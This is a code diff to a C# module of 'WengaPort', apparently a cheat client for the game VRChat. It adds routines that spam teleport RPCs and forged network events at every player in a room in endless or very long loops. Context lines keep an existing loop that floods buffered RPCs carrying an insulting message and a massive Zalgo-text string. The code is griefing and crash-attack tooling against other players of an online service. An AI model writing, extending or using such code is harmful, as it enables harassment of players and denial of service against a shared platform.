@@ -12,10 +12,14 @@ using RootMotion.FinalIK;
 using RealisticEyeMovements;
 using System.Linq;
 using System.Collections;
+using WengaPort.Api;
+using System.Threading;
+using WengaPort.Wrappers;
+using static VRC.SDKBase.VRC_EventHandler;
 
 namespace WengaPort.Modules
 {
-    class Photon
+    internal static class Photon
     {
 		public static bool EmojiSpam = false;
 		public static void EmojiRPC(int i)
@@ -183,6 +187,55 @@ namespace WengaPort.Modules
 			for (int i = 0; i < int.MaxValue; i++)
 			{
 				Networking.RPC(RPC.Destination.AllBufferOne, GameObject.Find("Camera (eye)").gameObject, "Get Fucked Russian Debug -Wenga#0666 L̛̛̾̈́̈̋͛͊̍͛̆̑̐̉̒̈̀̋̉̇̄͐͆͛͆́́̐͆̃̉̿́̀̐͋͐̃̎̅̊̀̌̾̎̓̽͛̑̃̿̈́͐̀̉̍͐̀͋̆̑̌̑̓̆̍̏͆̔̍͗̇́͋̓̍́̾͊̅̍̃̆͌̃͑͐̀̿̈́́̕͘̕͘̕̕͘͝͠͠͞͝͞͝͝͞͞͞͞͝͞L̛̛̾̈́̈̋͛͊̍͛̆̑̐̉̒̈̀̋̉̇̄͐͆͛͆́́̐͆̃̉̿́̀̐͋͐̃̎̅̊̀̌̾̎̓̽͛̑̃̿̈́͐̀̉̍͐̀͋̆̑̌̑̓̆̍̏͆̔̍͗̇́͋̓̍́̾͊̅̍̃̆͌̃͑͐̀̿̈́́̕͘̕͘̕̕͘͝͠͠͞͝͞͝͝͞͞͞͞͝͞", new Il2CppSystem.Object[0]);
+			}
+		}
+
+		public static IEnumerator Event6TPRPC()
+		{
+			for (; ; )
+            {
+				if (!Desync) yield break;
+				for (int I = 0; I < 15; I++)
+				{
+					foreach (var Player in Utils.PlayerManager.GetAllPlayers())
+					{
+						SendRPC(VrcEventType.SendRPC, "SendRPC", Player.field_Internal_VRCPlayer_0.gameObject, 9, 0, "TeleportRPC", VrcBooleanOp.False, VrcBroadcastType.AlwaysUnbuffered);
+					}
+				}
+				yield return new WaitForEndOfFrame();
+			}
+		}
+		public static void EventSpammer(this int count, int amount, System.Action action, int? sleep = null)
+		{
+			for (int ii = 0; ii < count; ii++)
+			{
+				for (int i = 0; i < amount; i++)
+					action();
+				if (sleep != null)
+					Thread.Sleep(sleep.Value);
+				else
+					Thread.Sleep(25);
+			}
+		}
+		public static void SendRPC(VrcEventType EventType, string Name, GameObject ParamObject, int Int, float Float, string String, VrcBooleanOp Bool, VrcBroadcastType BroadcastType)
+		{
+			if (handler == null)
+			{
+				handler = Resources.FindObjectsOfTypeAll<VRC_EventHandler>()[0];
+			}
+			VrcEvent a = new VrcEvent
+			{
+				EventType = EventType,
+				Name = Name,
+				ParameterObject = ParamObject,
+				ParameterInt = Int,
+				ParameterFloat = Float,
+				ParameterString = String,
+				ParameterBoolOp = Bool,
+			};
+			foreach (var Player in Utils.PlayerManager.GetAllPlayers())
+			{
+				handler.TriggerEvent(a, BroadcastType, Player.gameObject, 0f);
 			}
 		}
 	}
